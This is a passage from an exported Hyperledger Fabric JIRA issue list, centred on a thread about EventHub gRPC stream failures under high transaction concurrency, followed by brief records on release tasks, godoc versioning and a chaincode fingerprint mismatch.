  - Chaincode: test/fixture/src/github.com/examplecc modified to have 'put' function to write a value to an arbitrary key

After increasing the concurrency to over 300 (in my AWS environment), some of the invocations start to fail.
In the peer side, all the transactions are successfully committed, showing solely one error as follows:

{noformat}
2017-07-25 22:56:38.554 UTC [eventhub_producer] SendProducerBlockEvent -> INFO 152baf Channel [mychannel]: Sending event for block number [773]
2017-07-25 22:56:38.554 UTC [eventhub_producer] Send -> DEBU 152bb0 Entry
2017-07-25 22:56:38.554 UTC [eventhub_producer] Send -> DEBU 152bb1 Event processor timeout > 0
2017-07-25 22:56:38.554 UTC [eventhub_producer] Send -> DEBU 152bb2 Event sent successfully
2017-07-25 22:56:38.554 UTC [eventhub_producer] Send -> DEBU 152bb3 Exit
2017-07-25 22:56:38.554 UTC [eventhub_producer] SendProducerBlockEvent -> DEBU 152bb4 Exit
2017-07-25 22:56:41.730 UTC [eventhub_producer] Chat -> ERRO 152bb5 error during Chat, stopping handler: rpc error: code = Canceled desc = context canceled
2017-07-25 22:56:41.731 UTC [eventhub_producer] deRegisterHandler -> DEBU 152bb6 deregistering event type: BLOCK
2017-07-25 22:56:41.974 UTC [blocksProvider] DeliverBlocks -> DEBU 152bb7 [mychannel] Adding payload locally, buffer seqNum = [774], peers number [0]
2017-07-25 22:56:41.974 UTC [blocksProvider] DeliverBlocks -> DEBU 152bb8 [mychannel] Gossiping block [774], peers number [0]
2017-07-25 22:56:41.974 UTC [committer] Commit -> DEBU 152bb9 Validating block
2017-07-25 22:56:41.974 UTC [txvalidator] Validate -> DEBU 152bba START Block Validation
2017-07-25 22:56:41.974 UTC [txvalidator] Validate -> DEBU 152bbb Validating transaction peer.ValidateTransaction() {noformat}

In the SDK side, EventHub gets some error, and closing the connection, failing all the callbacks registered.
{noformat}
ok 480 [815] The balance transaction successfully committed
debug: [EventHub.js]: _processChainCodeOnEvents block=764
debug: [EventHub.js]: _processChainCodeOnEvents - no registered chaincode event ""listeners""
debug: [EventHub.js]: on.error - event stream:1 _current_stream:1
debug: [EventHub.js]: on.error - grpc stream state :3
debug: [EventHub.js]: _disconnect - start -- called due to:: Failed parsing HTTP/2
debug: [EventHub.js]: _closeAllCallbacks - start
debug: [EventHub.js]: _closeAllCallbacks - blockOnErrors 0
debug: [EventHub.js]: _closeAllCallbacks - transactionOnErrors 521
debug: [EventHub.js]: _closeAllCallbacks - closing this callback d55fc6c1a39cb185001f9bf623640cd9350caf6ead0a333b1f977bf42b991d18
not ok 481 [386] Event callback canceled
  ---
    operator: fail
    at: eh.registerTxEvent (/opt/gopath/src/github.com/hyperledger/fabric-sdk-node/test/integration/invoke-parallel-simplified.js:195:10)
    stack: |-
      Error: [386] Event callback canceled
          at Test.assert [as _assert] (/opt/gopath/src/github.com/hyperledger/fabric-sdk-node/node_modules/tape/lib/test.js:212:54)
          at Test.bound [as _assert] (/opt/gopath/src/github.com/hyperledger/fabric-sdk-node/node_modules/tape/lib/test.js:64:32)
          at Test.fail (/opt/gopath/src/github.com/hyperledger/fabric-sdk-node/node_modules/tape/lib/test.js:277:10)
          at Test.bound [as fail] (/opt/gopath/src/github.com/hyperledger/fabric-sdk-node/node_modules/tape/lib/test.js:64:32)
          at eh.registerTxEvent (/opt/gopath/src/github.com/hyperledger/fabric-sdk-node/test/integration/invoke-parallel-simplified.js:195:10)
          at closer (/opt/gopath/src/github.com/hyperledger/fabric-sdk-node/node_modules/fabric-client/lib/EventHub.js:430:5)
          at EventHub._closeAllCallbacks (/opt/gopath/src/github.com/hyperledger/fabric-sdk-node/node_modules/fabric-client/lib/EventHub.js:440:3)
          at EventHub._disconnect (/opt/gopath/src/github.com/hyperledger/fabric-sdk-node/node_modules/fabric-client/lib/EventHub.js:383:8)
          at ClientDuplexStream.<anonymous> (/opt/gopath/src/github.com/hyperledger/fabric-sdk-node/node_modules/fabric-client/lib/EventHub.js:354:10)
          at emitOne (events.js:96:13)
  ...
debug: [EventHub.js]: _closeAllCallbacks - closing this callback 9cf8d26e05d028025dd32722dcedffa848e9cd6aa6d92a00e83f2133172d377d
{noformat}
","fabric commit 2232d0ec348c81004e36ebbb1e1ab4d61f24b2cc
fabric-sdk-node commit 34dd6496fb65b8eaaf10901dd88df3e67f1f2a71
",bmos299,denyeart,dongming,grapebaba,ishihara.shun,jeffgarratt,JohanLee,JonathanLevi,lin2K,muralisr,n-someya,RobertDiebels,shimos,wlahti,xixuejia,ynamiki,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FABN-465,,,,,,,,,,,,"31/Oct/17 3:54 AM;shimos;example_cc.go;https://jira.hyperledger.org/secure/attachment/12830/example_cc.go","26/Jul/17 9:54 AM;shimos;invoke-parallel-simplified.js;https://jira.hyperledger.org/secure/attachment/11772/invoke-parallel-simplified.js",,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9nj:",,,,,,,,,,,,,,,,,,,,,,,bmos299,denyeart,dongming,grapebaba,ishihara.shun,jeffgarratt,JohanLee,JonathanLevi,lin2K,muralisr,n-someya,RobertDiebels,shimos,wlahti,xixuejia,ynamiki,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Sep/17 2:25 AM;shimos;Some error messages are seen also in endorsement proposals and commit requests.

{noformat}
[2017-09-14 22:23:39.249] [INFO] invoke-chaincode - transaction proposal was good
[2017-09-14 22:23:39.249] [DEBUG] invoke-chaincode - Successfully sent Proposal and received ProposalResponse: Status - 200, message - ""OK"", metadata - """", endorsement signature: 0E^B!^@���oϵ�
�^Y��JH��&�HN�6��3�S�ݗ��^B &^P=X����x4���o��$��7�^Y��N^^^X3
info: [EventHub.js]: _connect - options {""grpc.ssl_target_name_override"":""peer0.org1.example.com"",""grpc.default_authority"":""peer0.org1.example.com""}
[2017-09-14 22:23:39.252] [DEBUG] Helper - [crypto_ecdsa_aes]: ecdsa signature:  Signature {
  r: <BN: 2a31e714058b2bb3bb1d8c01a1b97812dcbcc5d9087b2adbe4e15c177986ec93>,
  s: <BN: 56fa1d3c6e03b6282079a03bcbecdbd3d0e9931b7d705d0d650c442bdde0f825>,
  recoveryParam: 1 }
[2017-09-14 22:23:39.254] [DEBUG] Helper - [crypto_ecdsa_aes]: ecdsa signature:  Signature {
  r: <BN: 634ebad74604a1463ff6762841e9875c6b1a64a9d5b26a8d797a6046c2b2d70b>,
  s: <BN: 190b46d99b659e8c70fce48ce55520ea31104a3f3c5f9d0a594af71fbdaccc9b>,
  recoveryParam: 0 }
E0914 22:23:39.255486949       9 ssl_transport_security.c:575] Could not add root certificate to ssl context.
E0914 22:23:39.255547752       9 ssl_transport_security.c:1297] Cannot load server root certificates.
E0914 22:23:39.255564368       9 security_connector.c:857]   Handshaker factory creation failed with TSI_INTERNAL_ERROR.
E0914 22:23:39.255569266       9 secure_channel_create.c:112] Failed to create secure subchannel for secure name 'peer0.org1.example.com:7053'
E0914 22:23:39.255574025       9 secure_channel_create.c:143] Failed to create subchannel arguments during subchannel creation.
E0914 22:23:39.258106349       9 ssl_transport_security.c:427] Corruption detected.
E0914 22:23:39.258136302       9 ssl_transport_security.c:403] error:0B07C065:x509 certificate routines:X509_STORE_add_cert:cert already in hash table
E0914 22:23:39.258142067       9 secure_endpoint.c:177]      Decryption error: TSI_DATA_CORRUPTED
error: [Orderer.js]: sendBroadcast - on error: ""Error: Endpoint read failed\n    at ClientDuplexStream._emitStatusIfDone (/opt/app/dev/node_modules/grpc/src/node/src/client.js:255:19)\n    at
ClientDuplexStream._receiveStatus (/opt/app/dev/node_modules/grpc/src/node/src/client.js:233:8)\n    at /opt/app/dev/node_modules/grpc/src/node/src/client.js:757:12""
[2017-09-14 22:23:39.258] [ERROR] invoke-chaincode - Failed to send transaction and get notifications within the timeout period.
[2017-09-14 22:23:39.258] [ERROR] invoke-chaincode - Failed to order the transaction. Error code: undefined
{noformat}

It seems it comes from grpc, so I reported to grpc community: https://github.com/grpc/grpc/issues/12642

The issue above might be related to this one.;;;","18/Oct/17 11:00 PM;bmos299;This bug does sound like a match with https://github.com/grpc/grpc/issues/12642.  In our having to use an older version of the node sdk to avoid this issue.  I am changing the status to high.   It probably borders on highest as concurrency breaks.;;;","18/Oct/17 11:10 PM;bmos299;In talking with [~denyeart] moving to highest. Murali suspects this may not be a grpc bug, but a bug in our locking. He suggests the following lock may need to used from handler.go:

 

 
{code:java}
//serialSend serializes msgs so gRPC will be happy
 func (handler *Handler) serialSend(msg *pb.ChaincodeMessage) error {
 handler.serialLock.Lock()
 defer handler.serialLock.Unlock()
var err error
 if err = handler.ChatStream.Send(msg); err != nil
{ err = errors.WithMessage(err, fmt.Sprintf(""[%s]Error sending %s"", shorttxid(msg.Txid), msg.Type.String())) chaincodeLogger.Errorf(""%+v"", err) }
return err
 }
{code}
 

 ;;;","19/Oct/17 12:35 AM;bmos299;This seems to have occurred more consistently between the node sdk and the fabric ca. ;;;","19/Oct/17 8:22 AM;shimos;[~bmos299] Recently when I tried to run PTE with TLS disabled, this bug seemed to occur. So probably you're right, it might not be because of the gRPC bug (it's a TLS-related issue)...

But note that there seems to be a different bug related to the gRPC bug as reported in FAB-6266.;;;","20/Oct/17 3:55 PM;lin2K;same problem with java sdk. I think this is a server side problem.;;;","21/Oct/17 4:33 AM;denyeart;Based on latest comments, shifting to fabric-peer.

 [~muralisr] can you elaborate on your theory here?;;;","22/Oct/17 2:58 AM;muralisr;[~denyeart] I was going by 
{code:java}
E0914 22:23:39.258106349       9 ssl_transport_security.c:427] Corruption detected.
{code}

One possibility is concurrent writes on the gRPC stream without locks to serialize those writes. This can happen if there are multiple fabric channels generating blocks concurrently (that's probably NOT the case here if we are dealing with a single channel). 

The other possibility is client (nodejs) is sending multiple events on the same event stream concurrently. Is this what you mean by the following [~lin2K] ?
{code:java}
EventHub is shared by all the invocations, thus the number of event connection is just one.
{code}

A quick check would be to wrap this snippet of code with a lock in events/producer/handler.go
https://github.com/hyperledger/fabric/blob/master/events/producer/handler.go#L127 like shown in the ""serialSend"" example by [~bmos299] comment.  Tagging ...  [~wlahti]

If you are sending concurrent events from the client side, [~lin2K] you would have to do a similar fix on the nodejs side as well.;;;","24/Oct/17 3:31 AM;shimos;[~muralisr] I'm answering because I think below is for me..

{noformat}
The other possibility is client (nodejs) is sending multiple events on the same event stream concurrently. Is this what you mean by the following Tony kong ?

EventHub is shared by all the invocations, thus the number of event connection is just one.
{noformat}

Right. I invoked transactions concurrently form a single nodejs client, and register their transactions to the same EventHub. So all the block events should have come through the single event stream. (And they did for a while until this disconnection happened);;;","27/Oct/17 4:06 AM;jeffgarratt;Have you taken a look at this [~wlahti]?;;;","31/Oct/17 2:32 AM;wlahti;[~shimos] Can you provide the modified chaincode you used?;;;","31/Oct/17 3:54 AM;shimos;[~wlahti] Sure, I have attached the chaincode. [^example_cc.go] ;;;","31/Oct/17 4:44 AM;wlahti;Thanks.

To clarify, you're using invoke-parallel-simplified.js in place of invoke.js, the updated example_cc.go, and then running `{{node test/integration/e2e.js}}` (or the individual tests one by one) to reproduce this? Any other necessary steps?;;;","31/Oct/17 5:34 AM;shimos;[~wlahti] Yes, I rather ran tests individually ( create-channel.js, join-channel.js, ..) but the steps you mention should be sufficient.;;;","31/Oct/17 6:57 AM;wlahti;Are you able to hit this error every time? I finally have the Node SDK tests working locally but I haven't seen this issue using the latest Fabric, Node SDK, and Fabric CA code from master. I'll try with the v1.0 code next.

[~shimos] Any chance you can log in to Rocketchat to discuss at some point? I think that'll help move things along. ;;;","01/Nov/17 1:17 AM;shimos;[~wlahti] Thanks for testing. When I reported this in July, it occurred almost every time.
But now I run with the current master and release branch, it seems not to be happening any more as you say.

I also tested with v1.0.0, and it produced eventhub reconnection and timeout errors, so something after 1.0.0 has fixed at least my issue.

As for Rocket.chat, sure, which channel would be suitable?;;;","01/Nov/17 10:48 PM;wlahti;[~shimos] Since this no longer appears to be an issue with the latest code, do you think we can go ahead and close this JIRA?;;;","02/Nov/17 12:35 AM;shimos;[~wlahti] Okay for my case, but I'm wondering if this might still happen because some people posted comments here reporting this in the different situation..;;;","02/Nov/17 12:39 AM;wlahti;Ah yes, good point. They hadn't chimed in here recently so I overlooked those comments. [~lin2K] [~bmos299], do you notice this issue using the code from master or only in v1.0 networks?;;;","02/Nov/17 4:40 AM;bmos299;I have hit this problem on Fabric 1.0.3. ;;;","05/Nov/17 2:12 AM;jeffgarratt;[~bmos299] was this sporadic or easily repeatable under a specific load?;;;","27/Nov/17 10:38 AM;denyeart;[~bmos299] It the problem easily reproducible on 1.0.x?  How about on 1.0 master?;;;","07/Dec/17 6:33 AM;xixuejia;This issue should also be fixed by https://gerrit.hyperledger.org/r/#/c/15719/  

Hi [~bmos299], would you please also try that fix? Several users have confirmed that the above patch fixed this issue;;;","09/Jan/18 1:12 AM;wlahti;[~bmos299] Any update on trying the workaround mentioned above by Xi Xue Jia?;;;","26/Jan/18 11:03 PM;wlahti;[~bmos299] [~dongming] Any chance to try out this workaround yet?;;;","27/Jan/18 12:19 AM;dongming;[~wlahti] In my PTE test, I do not see the issue with the latest master fabric and sdk.;;;","31/Jan/18 4:49 AM;wlahti;Since [~shimos] (the reporter of this item) and [~dongming] have both reported positive test results, marking this item as complete. If there's anyone else I'm unaware of who's still hitting this issue, please comment and re-open the item.;;;","04/May/18 8:34 PM;grapebaba;we are hitting this issue on fabric 1.0.2, we already update the node sdk patch, this error still ocurr;;;","18/Jun/18 9:03 PM;RobertDiebels;I was hitting this issue as well.

Versions:
fabric-peer 1.0.x (tested on 1.0.0, 1.0.4 and 1.0.6)
fabric-client (NodeJS): ^1.1.0

Downgrading fabric-client to 1.0.8 as well as ensuring I'm using grpc version 1.10.1 for NodeJS fixed the issue for me. The fabric-peer version I'm using is 1.0.6.;;;",,,,,,,,,,
Init common metrics module,FAB-5465,19483,15982,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,grapebaba,grapebaba,grapebaba,26/Jul/17 11:50 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,24/Aug/17 5:39 PM,,,,,,fabric-ci,,,,,,0,HSBN,,,,,,Init common metrics module,,grapebaba,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9nr:",,,,,,,,,,,,,,,,,,,,,,,grapebaba,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Pluggable SystemCC registry,FAB-5466,19487,19351,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,26/Jul/17 5:26 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,12/Aug/17 10:40 PM,v1.0.0,,,v1.1.1,,fabric-peer,,,,,,0,,,,,,,The SystemCC needs a registry that is loaded upon peer startup based on a file. ,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9of:",,,,,,,,,,,,,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cut v1.0.1 release,FAB-5467,19488,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,26/Jul/17 6:30 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,13/Aug/17 6:17 AM,,,,v1.0.1,,fabric-release,,,,,31/Jul/17 12:00 AM,0,,,,,,,"Cut patch release for v1.0.0

For this round, the process will be to cherry pick fixes for critical bugs from the master branch and apply them to the release branches for each component / project.  The cherry picks will be squashed into a single CR per project for expediency.",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9on:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Set fix version to v1.0.1 for fabric bugs to be included in 1.0.1 release,FAB-5468,19489,19488,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,26/Jul/17 6:35 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Jul/17 6:35 PM,,,,v1.0.1,,fabric-release,,,,,,0,,,,,,,https://jira.hyperledger.org/issues/?filter=10725,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5469,FAB-5470,FAB-5472,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9ov:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,release-1.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Set fix version to v1.0.1 for fabric-sdk-node bugs to be included in 1.0.1 release,FAB-5469,19490,19488,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jimthematrix,mastersingh24,mastersingh24,26/Jul/17 6:37 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Aug/17 4:40 AM,,,,v1.0.1,,fabric-sdk-node,,,,,,0,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5471,,,FAB-5468,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9p3:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Set fix version to v1.0.1 for fabric-ca bugs to be included in 1.0.1 release,FAB-5470,19491,19488,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,26/Jul/17 6:37 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,28/Jul/17 5:22 AM,,,,v1.0.1,,fabric-release,,,,,,0,,,,,,,https://jira.hyperledger.org/issues/?filter=10726,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5468,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9pb:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Set fix version to v1.0.1 for fabric-sdk-java bugs to be included in 1.0.1 release,FAB-5471,19492,19488,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,mastersingh24,mastersingh24,26/Jul/17 6:38 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,08/Aug/17 10:37 PM,,,,v1.0.1,,fabric-sdk-java,,,,,,0,,,,,,,,,mastersingh24,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5469,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9pj:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Jul/17 10:46 PM;rickr;AFAIK we've done this.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Set fix version to v1.0.1 for fabric-samples bugs to be included in 1.0.1 release,FAB-5472,19493,19488,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,mastersingh24,mastersingh24,26/Jul/17 6:39 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,13/Aug/17 6:16 AM,,,,v1.0.1,,fabric-samples,,,,,,0,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5468,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9pr:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
chaincode tutorial does not link to godoc API documentation,FAB-5474,19495,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,ChristopherFerris,ChristopherFerris,26/Jul/17 9:40 PM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,28/Jul/17 2:31 AM,v1.0.0,,,v1.0.1,,fabric-docs,,,,,,0,,,,,,,http://godoc.org/github.com/hyperledger/fabric/core/chaincode/shim,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy9q7:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"26/Jul/17 10:37 PM;ChristopherFerris;https://gerrit.hyperledger.org/r/11941;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
need to be able to publish version-specific godoc for Fabric projects,FAB-5475,19496,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Won't Do,,ChristopherFerris,ChristopherFerris,26/Jul/17 9:45 PM,23/Jan/20 6:56 AM,28/Oct/23 3:00 AM,23/Jan/20 6:56 AM,v1.0.0,,,Future,,fabric-build,fabric-docs,,,,,0,stale-item,,,,,,"Need to publish version-specific godoc content for each published version for fabric repos that employ golang and have public APIs.

godoc publishes the packages fine, but will only publish the latest released version. We need version-specific resources.",,ChristopherFerris,jtclark,rameshthoomu,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy9qf:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ChristopherFerris,jtclark,rameshthoomu,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Aug/17 11:01 PM;rameshthoomu;[~ChristopherFerris] How are we publishing this now? Could you please give me some references to current godoc publish process.;;;","07/Sep/17 1:59 AM;jtclark;Taking this one up from [~rameshthoomu].

[~ChristopherFerris]: As asked, can you confirm how we are publishing docs now?;;;","07/Sep/17 6:19 AM;ChristopherFerris;AFAIK, the docs are here: [https://godoc.org/github.com/hyperledger/fabric] 

The challenge is versioning them. Go seems to think that versions are not important;-) j/k.  I believe that the link above is just a reflection of the github repository. 

What we should do is publish version-specific godocs (1.0.*, 1.1.* etc). So, we should leverage godoc to generate the output and host on nexus, I think, and make this part of the release process.;;;","17/Oct/17 10:57 AM;jtclark;Attn: [~ChristopherFerris], [~mastersingh24], [~odowdaibm]

After some research, I've found e a couple of tool options that we could use to generate the docs:

1- [godoc|https://godoc.org/golang.org/x/tools/cmd/godoc] - This option we already know. With godocs, we can use it to generate the documentation, but the rendered HTML is 'style-less', void of CSS. I've tested this locally, and the rendered HTML is plain old HTML. We would have to invest in creating the CSS to accompany the rendered HTML, but it can be done.

2- [godocdown|https://github.com/robertkrimen/godocdown] - This tool was discovered by [~mastersingh24], and it can be used to generate Markdown text. We can use this to generate the Markdown, and add potentially add this content to readthedocs.

With either option, I'm thinking that the process would work as follows:

1) Create a Jenkins job that is responsible for auto-generating the docs, by subscribing to the release branch(es) of each golang project.
 2) Example: With the fabric project, there will eventually be a release branch tagged as 1.2. When the Jenkins job runs, it fetches the 1.2 branch of fabric, and begin to generate the documentation.
 3) The docs are tagged with the same release number, and published to nexus, readthedocs, or some other repo of our choosing.

This is the approach I was going for, but I'm open to hearing other approaches that may work better. Please add your commentary, as I'd like to make a decision on which way we should go about this before proceeding.;;;","20/Oct/17 9:38 PM;ChristopherFerris;markdown would need to be translated to restructured text (rst) but there's a tool for that. The thing is that the source for the RTD build is github repo. We don't want to (I don't think) add a bunch of generated docs to our GH repo (and Gerrit). 

Why can't we just generate the godoc (never mind the format, go devs are used to seeing standard godoc format) for a release, store that in Nexus and link to it from the docs. Seems simplest approach.;;;","26/Feb/18 8:18 PM;jtclark;*Status Update*

This task has been idle for quite some time. Placing this into 'IN PROGRESS'.

Next thing to do is to create a new Jenkins job that generates the documentation using godocs.  Need to find out from [~rameshthoomu] how to publish the docs to Nexus.;;;","23/Jan/20 6:56 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Chaincode install path is used in fingerprint calculation,FAB-5476,19497,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,muralisr,dshuffma,dshuffma,26/Jul/17 10:18 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Feb/18 2:13 AM,v1.0.0,,,Not a Bug,WON'T FIX,fabric-peer,,,,,,1,HSBN,,,,,,"When installing chaincode you provide a path, ID, and version.  All three attributes become part of a ""fingerprint"" that must match when invoking chaincode. The issue appears when you install the same chaincode but used a *different* path.  This situation will happen organically when different people on the same channel want to run the chaincode independently.  example:

person A installs on Peer1 with:
*path* - /uhoh/chaincode/marbles/dir,
*id* - marbles
*version* - v1

and person B installs on Peer2 with:
*path* - /marbles
*id* - marbles
*version* - v1

then lets pick Person A to instantiate the chaincode on a channel both peers have joined. the intent was that each person would have their own chaincode running, but b/c the path is different invokes will fail to run on person B's peer.

the error in the peer:

{code}
error: [Chain.js]: Chain-sendPeersProposal - Promise is rejected: Error: Error executing chaincode: Could not get deployment transaction from LSCC for uisdk:v - Get ChaincodeDeploymentSpec for uisdk/uisdk from LSCC error: chaincode fingerprint mismatch data mismatc
{code}

everything works normally if the paths are identical.

this was tested with v1.0.0 fabric and v1.0.0 fabric-client (sdk).",,dshuffma,habpy,mastersingh24,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-7065,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9qn:",,,,,,,,,,,,,,,,,,,,,,,dshuffma,habpy,mastersingh24,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Jul/17 8:46 PM;Clayton Sims;Late yesterday, Murali said he talked to David and this this is not considered a must fix.;;;","07/Sep/17 4:46 PM;habpy;Issue also manifests itself if `chain code`  is changed slightly, e.g. removing a comment even if paths are identical. Changing version or id is not ideal, because when working with CouchDB all data are lost.;;;","08/Sep/17 3:42 AM;muralisr;[~mastersingh24] what do think the disposition should be for this ?;;;","03/Feb/18 2:13 AM;mastersingh24;I don't think this is a bug.  I think perhaps the documentation could be clearer in that PATH is supposed to be the actual chaincode package.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
cleanup dead code in bddtests/regression folder,FAB-5478,19499,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,26/Jul/17 11:34 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,31/Aug/17 11:20 PM,v1.0.0-rc1,,,v1.1.1,,fabric-quality,,,,,,0,quality,,,,,,"In the recent consolidation of the test scripts, we had moved regression behave tests to ""test"" folder and left dead code in ""bddtests/regression"" folder. Duplication of this is confusing people.

